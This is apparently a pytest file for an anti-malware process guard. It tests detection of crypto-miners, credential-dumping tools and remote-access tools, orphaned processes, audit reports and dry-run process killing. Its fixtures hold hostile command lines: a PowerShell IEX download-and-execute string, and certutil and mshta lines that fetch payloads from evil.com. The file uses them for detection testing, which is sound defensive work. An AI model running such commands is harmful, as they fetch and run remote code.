"""Tests for the anti-malware guard module."""
import pytest
from unittest.mock import patch, MagicMock
from workstation.modules.guard import (
    Finding,
    guard_audit,
    kill_finding,
    kill_findings,
    _check_suspicious_name,
    _check_suspicious_cmdline,
    SEV_CRITICAL, SEV_HIGH, SEV_WARN,
)
from workstation.core.process import ProcessInfo


def _fake_info(pid=9999, name="", ram_mb=100, cmdline="", cwd=""):
    return ProcessInfo(
        pid=pid, name=name, ram_mb=ram_mb, ram_gb=ram_mb/1024,
        cmdline=cmdline, cwd=cwd, parent_pid=1, status="running",
    )


class TestNameHeuristics:
    def test_crypto_miner_is_critical(self):
        info = _fake_info(name="xmrig.exe")
        result = _check_suspicious_name(info, "C:\\miner\\xmrig.exe")
        assert result is not None
        assert result.severity == SEV_CRITICAL
        assert result.auto_kill is True

    def test_rat_name_is_critical(self):
        # "RAT" in reason string → severity CRITICAL (not just HIGH)
        info = _fake_info(name="anydesk.exe")
        result = _check_suspicious_name(info, "C:\\Program Files\\AnyDesk\\anydesk.exe")
        assert result is not None
        assert result.severity == SEV_CRITICAL
        assert result.verdict == "suspicious"
        assert result.category == "known-bad-name"

    def test_random_obfuscated_name(self):
        info = _fake_info(name="a3f8c2d1")
        result = _check_suspicious_name(info, "C:\\Users\\Admin\\AppData\\Local\\Temp\\a3f8c2d1")
        assert result is not None
        assert result.category == "known-bad-name"

    def test_clean_name_is_none(self):
        info = _fake_info(name="python.exe")
        result = _check_suspicious_name(info, "C:\\Python\\python.exe")
        assert result is None

    def test_mimikatz_is_high(self):
        info = _fake_info(name="mimikatz.exe")
        result = _check_suspicious_name(info, "C:\\tools\\mimikatz.exe")
        assert result is not None
        assert result.severity == SEV_HIGH

    def test_parentless_clean_process_skipped(self):
        # Normal process (explorer.exe) going parentless should NOT be flagged
        from workstation.modules.guard import _check_parentless
        import psutil
        info = _fake_info(pid=9999, name="explorer.exe", cmdline="C:\\WINDOWS\\Explorer.EXE")
        with patch("workstation.modules.guard._parent_exists", return_value=False):
            with patch("workstation.modules.guard._exe_path", return_value="C:\\WINDOWS\\Explorer.EXE"):
                result = _check_parentless(None, info)
        assert result is None  # not flagged — normal Windows process

    def test_parentless_suspicious_flags(self):
        from workstation.modules.guard import _check_parentless
        # Process with random hex name going parentless should be flagged
        info = _fake_info(pid=9999, name="a3f8c2d1e5f7", cmdline="", parent_pid=9998)
        with patch("workstation.modules.guard._parent_exists", return_value=False):
            result = _check_parentless(None, info)
        assert result is not None
        assert result.category == "parentless"
        assert result.verdict == "orphaned"


class TestCmdlineHeuristics:
    def test_iex_download_execute(self):
        info = _fake_info(name="powershell.exe", cmdline='powershell -c "IEX((New-Object Net.WebClient).DownloadString(...))"')
        result = _check_suspicious_cmdline(info, info.cmdline)
        assert result is not None
        assert result.severity == SEV_HIGH
        assert "suspicious-cmdline" in result.category

    def test_certutil_download(self):
        info = _fake_info(name="certutil.exe", cmdline='certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\p.exe')
        result = _check_suspicious_cmdline(info, info.cmdline)
        assert result is not None
        assert "certutil" in result.evidence

    def test_mshta_remote(self):
        info = _fake_info(name="mshta.exe", cmdline="mshta http://evil.com/payload.hta")
        result = _check_suspicious_cmdline(info, info.cmdline)
        assert result is not None

    def test_clean_cmdline_none(self):
        info = _fake_info(name="python.exe", cmdline="python -c 'print(1)'")
        result = _check_suspicious_cmdline(info, info.cmdline)
        assert result is None


class TestGuardAudit:
    """guard_audit scans live processes so we mock list_processes for speed."""

    @staticmethod
    def _mock_audit(threshold=50, include_clean=False, include_suspicious=False):
        with patch("workstation.modules.guard.list_processes") as mock_list:
            infos = [
                _fake_info(pid=100, name="python.exe", ram_mb=200),
                _fake_info(pid=200, name="code.exe", ram_mb=300),
            ]
            if include_suspicious:
                infos.append(_fake_info(pid=300, name="xmrig.exe", ram_mb=150,
                                       cmdline="xmrig -o pool.example.com"))
            mock_list.return_value = infos
            return guard_audit(threshold_mb=threshold, include_clean=include_clean)

    def test_guard_audit_returns_structure(self):
        report = self._mock_audit()
        assert "timestamp" in report
        assert "findings" in report
        assert "summary" in report
        assert "processes_scanned" in report

    def test_guard_audit_findings_have_required_fields(self):
        report = self._mock_audit()
        for f in report["findings"]:
            assert "pid" in f
            assert "name" in f
            assert "severity" in f
            assert "category" in f
            assert "detail" in f
            assert "evidence" in f
            assert "verdict" in f

    def test_guard_audit_include_clean_reports_python_code(self):
        report = self._mock_audit(include_clean=True)
        assert "safe_processes" in report
        assert any(p["name"] == "python.exe" for p in report["safe_processes"])

    def test_guard_audit_xmrig_detected(self):
        report = self._mock_audit(include_suspicious=True)
        assert report["summary"]["total"] >= 1
        assert report["summary"]["critical"] >= 1
        names = [f["name"] for f in report["findings"]]
        assert "xmrig.exe" in names

    def test_guard_audit_summary_totals(self):
        report = self._mock_audit()
        s = report["summary"]
        assert s["critical"] + s["high"] + s["warning"] + s["info"] == s["total"]


class TestKillFindings:
    def test_kill_findings_dry_run_skips_all(self):
        findings = [
            Finding(pid=99999, name="test.exe", severity=SEV_CRITICAL,
                    category="test", detail="test", evidence="test",
                    verdict="suspicious", auto_kill=True),
        ]
        result = kill_findings(findings, execute=False)
        assert result["dry_run"] is True
        assert result["killed"] == []
        assert len(result["skipped"]) == 1

    def test_kill_findings_none_is_safe(self):
        result = kill_findings([], execute=False)
        assert result["dry_run"] is True
        assert result["killed"] == []
        assert result["skipped"] == []

    def test_kill_finding_nonexistent_pid_returns_false(self):
        # Expect False when process doesn't exist or access denied
        result = kill_finding(999999)
        assert result is False


class TestOutputFormat:
    def test_print_guard_report_no_findings(self, capsys):
        from workstation.modules.guard import print_guard_report
        report = {
            "timestamp": "2026-01-01T00:00:00",
            "platform": "Windows",
            "processes_scanned": 5,
            "findings": [],
            "summary": {"total": 0, "critical": 0, "high": 0, "warning": 0, "info": 0,
                        "orphaned": 0, "zombie": 0, "suspicious": 0, "auto_kill": 0},
            "safe_processes": [],
        }
        print_guard_report(report)
        captured = capsys.readouterr().out
        assert "No suspicious processes detected" in captured

    def test_print_guard_report_with_findings(self, capsys):
        from workstation.modules.guard import print_guard_report
        report = {
            "timestamp": "2026-01-01T00:00:00",
            "platform": "Windows",
            "processes_scanned": 10,
            "findings": [
                {"pid": 1234, "name": "xmrig.exe", "severity": SEV_CRITICAL,
                 "category": "known-bad-name", "detail": "crypto-miner known binary name",
                 "evidence": "exe=C:\\miner\\xmrig.exe", "verdict": "suspicious",
                 "auto_kill": True},
            ],
            "summary": {"total": 1, "critical": 1, "high": 0, "warning": 0, "info": 0,
                        "orphaned": 0, "zombie": 0, "suspicious": 1, "auto_kill": 1},
            "safe_processes": [],
        }
        print_guard_report(report)
        captured = capsys.readouterr().out
        assert "CRITICAL" in captured
        assert "xmrig.exe" in captured
        assert "AUTO-KILL" in captured
